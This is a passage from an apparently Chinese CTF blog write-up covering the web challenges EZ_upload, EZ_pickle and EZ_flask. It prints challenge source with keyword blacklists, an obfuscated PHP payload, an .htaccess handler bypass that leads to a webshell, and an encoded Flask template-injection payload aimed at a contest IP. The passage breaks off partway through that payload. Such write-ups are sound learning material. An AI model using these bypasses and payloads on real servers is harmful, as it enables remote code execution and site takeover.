class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))))()))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/24/gkUB4tPzeCioVv7.png" alt="image-20201224192839797"></p><p><img src="https://i.loli.net/2020/12/24/SsHDxGWBlfgIVuL.png" alt="image-20201224193041277"></p><h3 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h3><p>扫描目录</p><p><img src="https://i.loli.net/2020/12/24/XJYx8NE9c2OyiGw.png" alt="image-20201224201258096"></p><p>访问可访问的目录</p><p><img src="https://i.loli.net/2020/12/24/4weYqknSfE2m5Bz.png" alt="image-20201224201355301"></p><p>hinit_1</p><p><img src="https://i.loli.net/2020/12/25/S3kCDtJu2KMqgIQ.png" alt="image-20201225143656131"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//hint_2  源码</span><br><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Missing something&quot;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br>$content = $_POST[<span class="hljs-string">&#x27;content&#x27;</span>];<br>$filename = $_POST[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!is_string($content) || strlen($content) &gt; <span class="hljs-number">125</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;content is too long!!!&quot;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (!is_string($filename) || strlen($filename) &gt; <span class="hljs-number">10</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;filename is too long!!!&quot;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">31</span>; $i++) &#123;<br>    <span class="hljs-keyword">if</span> ($i !== <span class="hljs-number">10</span> &amp;&amp; stristr($content, chr($i))) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;only visible character &quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">127</span>; $i &lt; <span class="hljs-number">256</span>; $i++) &#123;<br>    <span class="hljs-keyword">if</span> (stristr($content, chr($i))) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;only visible character &quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br>$content_blacklist = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;session&quot;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;upload&quot;</span>, <span class="hljs-string">&quot;append&quot;</span>, <span class="hljs-string">&quot;prepend&quot;</span>, <span class="hljs-string">&quot;log&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;include&quot;</span>, <span class="hljs-string">&quot;zend&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;pcre&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;\\\\&quot;</span>,<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span> );<br><span class="hljs-keyword">foreach</span> ($content_blacklist <span class="hljs-keyword">as</span> $keywords) &#123;<br>    <span class="hljs-keyword">if</span> (stristr($content, $keywords)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br>$filename_blacklist = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ph&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>,<span class="hljs-string">&#x27;pl&#x27;</span>,<span class="hljs-string">&#x27;perl&#x27;</span>,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-string">&quot;py&quot;</span>);<br>$append_string = <span class="hljs-string">&quot;ohohohohohohohohoh!&quot;</span>;<br>$yourdir = md5($_COOKIE[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]);<br><span class="hljs-keyword">foreach</span> ($filename_blacklist <span class="hljs-keyword">as</span> $file_keys) &#123;<br>    <span class="hljs-keyword">if</span> (stristr($filename, $file_keys)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!is_dir($yourdir)) &#123;<br>    @mkdir($yourdir);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    file_put_contents($yourdir . <span class="hljs-string">&#x27;/&#x27;</span> . $filename, $content . $append_string);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file&#x27;s path:  /var/www/html/&quot;</span>.$yourdir . <span class="hljs-string">&#x27;/&#x27;</span> . $filename;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br> <span class="hljs-comment">// 过滤了AddType  setHandler  </span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload:<br>上传 .htaccess<br>AddHandler application/x-httpd-php .aa .<span class="hljs-string">&quot;&quot;</span> <span class="hljs-number">123</span><br><span class="hljs-regexp">//</span>AddHandler 居然还能这么用……  涨知识<br><br><br><span class="hljs-regexp">//</span> <span class="hljs-string">&quot;&quot;</span> 可以起到注释作用<br>然后使用短标签，传入后缀为.aa的文件，并且使用注释 <span class="hljs-regexp">//</span> <br></code></pre></td></tr></table></figure><p>菜刀连接</p><p><img src="https://i.loli.net/2020/12/30/Hce1lVCbvQZTKfo.png" alt="image-20201230205613400"></p><h3 id="EZ-pickle"><a href="#EZ-pickle" class="headerlink" title="EZ_pickle"></a>EZ_pickle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, escape, request <br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io <br><span class="hljs-keyword">import</span> module_flag <br>beifen=module_flag.sys.modules <br>app = Flask(__name__) <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span> <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span> <br>        blackList =[<span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;pickle&quot;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;Flask&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>,<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;attr&#x27;</span>,<span class="hljs-string">&#x27;dict&#x27;</span>,<span class="hljs-string">&#x27;modules&#x27;</span>] <br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> blackList:<br>            <span class="hljs-keyword">if</span> b <span class="hljs-keyword">in</span> module <span class="hljs-keyword">or</span> b <span class="hljs-keyword">in</span> name: <br>                <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name)) <br>                <span class="hljs-keyword">if</span> module == <span class="hljs-string">&#x27;module_flag&#x27;</span> <span class="hljs-keyword">and</span> (name[:<span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;_&#x27;</span>): <br>                    <span class="hljs-keyword">return</span> getattr(module_flag.sys.modules[<span class="hljs-string">&#x27;module_flag&#x27;</span>], name) <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name)) <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restricted_loads</span>(<span class="hljs-params">s</span>):</span> <br>        res = RestrictedUnpickler(io.BytesIO(s)).load() <br>        print(module_flag.sys.modules) <br>        module_flag.sys.modules = beifen <br>        print(module_flag.sys.modules) <br>        <span class="hljs-keyword">return</span> str(res) <br><span class="hljs-meta">@app.route(&#x27;/&#x27;) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span> <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;view source /src&#x27;</span> <br><span class="hljs-meta">@app.route(&#x27;/src&#x27;) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">src</span>():</span> <br>        file = open(<span class="hljs-string">&quot;/src/app.py&quot;</span>).read() <br>        <span class="hljs-keyword">return</span> file <br><span class="hljs-meta">@app.route(&#x27;/pickle&#x27;) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">NoVulnPickle</span>():</span> <br>        <span class="hljs-keyword">try</span>: <br>            //代码偶尔能访问，逻辑错误，只过滤了system<br>            p = request.args.get(<span class="hljs-string">&quot;pickle&quot;</span>) <br>            blackList = [<span class="hljs-string">&quot;system&quot;</span> ,<span class="hljs-string">&quot;os&quot;</span> ,<span class="hljs-string">&quot;popen&quot;</span> , <span class="hljs-string">&quot;pickle&quot;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;Flask&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>,<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;attr&#x27;</span>,<span class="hljs-string">&#x27;dict&#x27;</span>,<span class="hljs-string">&#x27;modules&#x27;</span>,<span class="hljs-string">&#x27;global&#x27;</span>] <br>         <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> blackList: <br>            <span class="hljs-keyword">if</span> b <span class="hljs-keyword">in</span> p: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hacker!&quot;</span> <br>            <span class="hljs-keyword">else</span>: <br>                p = p.encode() <br>                <span class="hljs-comment"># print(p) </span><br>          <span class="hljs-keyword">return</span> restricted_loads(p) <br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e: <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;failed&#x27;</span> <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;OK&quot;</span> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>: <br>app.run(debug=<span class="hljs-literal">False</span>,host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-string">&#x27;5000&#x27;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>看完代码，一脸懵逼，这题不会，寒假学习:anger: （寒假没了）</p></blockquote><h3 id="EZ-flask"><a href="#EZ-flask" class="headerlink" title="EZ_flask"></a>EZ_flask</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//爆破md5</span><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i in <span class="hljs-keyword">range</span>(<span class="hljs-number">100000000</span>):<br>    i=str(i)<br>    h=hashlib.md5()<br>    h.update(i.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    a = h.hexdigest()<br>    <span class="hljs-keyword">if</span>( a[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] == <span class="hljs-string">&quot;52491&quot;</span> ):<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>     <span class="hljs-comment">// 具体md5值按实际情况更改</span><br></code></pre></td></tr></table></figure><p>测试发现题目中 <code>&#123;</code> 和 <code>&#125;</code>  不能同时在一起 ，用户名和后面的参数我们可控，所以分开构造<code>&#123;&#125;</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">// uasename=&#123;&#123;&quot; </span><br>session:eyJoYXNoMSI6ImU0ODZhIiwicGFzc3dvcmQiOiIxODkxMzEwIiwic3RhdHVzIjoxLCJ1c2VybmFtZSI6Int7XCIifQ.X-YGjg<span class="hljs-number">.2</span>-hzaxNZJk0O<span class="hljs-number">-889</span>uMo3wnxMBkE<br></code></pre></td></tr></table></figure><p>这里先直接贴出payload；考试后去学习</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">http://<span class="hljs-number">219.219</span>.<span class="hljs-number">61.234</span>:<span class="hljs-number">50007</span>/<span class="hljs-string">&quot;|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,99,108,97,115,115,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,98,97,115,101,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span 